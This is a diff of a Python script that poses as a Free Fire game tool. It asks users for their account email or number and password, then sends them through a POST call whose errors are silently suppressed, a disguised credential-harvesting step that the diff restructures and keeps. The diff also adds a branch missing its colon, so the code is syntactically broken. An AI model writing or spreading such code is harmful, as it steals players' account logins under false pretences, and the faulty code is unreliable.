@@ -27,23 +27,21 @@ THANKS FOR USING THIS TOOL
 ''')
 
 time.sleep(5)
-
-print('now enter your free fire account details')
-
-pro = input("enter your email or number: ")
-
-time.sleep(4)
-
-boy = input('now enter your password: ')
-
 try:
+  print('now enter your free fire account details')
+  pro = input("enter your email or number: ")
+  time.sleep(4)
+  boy = input('now enter your password: ')
+  try:
 
-  POST(user=pro, msg=boy)
+     POST(user=pro, msg=boy)
 
+  except:
+
+    pass
 except:
-
-  pass
-
+  print ("some thing went wrong re enter values")
+  os.system("python3 free_fire.py")
 print("\nnow enter what you want")
 print("\n\n")
 print ('''
@@ -73,9 +71,10 @@ elif ok == '2':
 elif ok == '3':
 
   print ("Done")
+elif ok == "4"
+  exit()
 
 else:
 
-  print ("tool exited")
-
-exit() # the end
+  print ("Enter valid value")
+  exit()
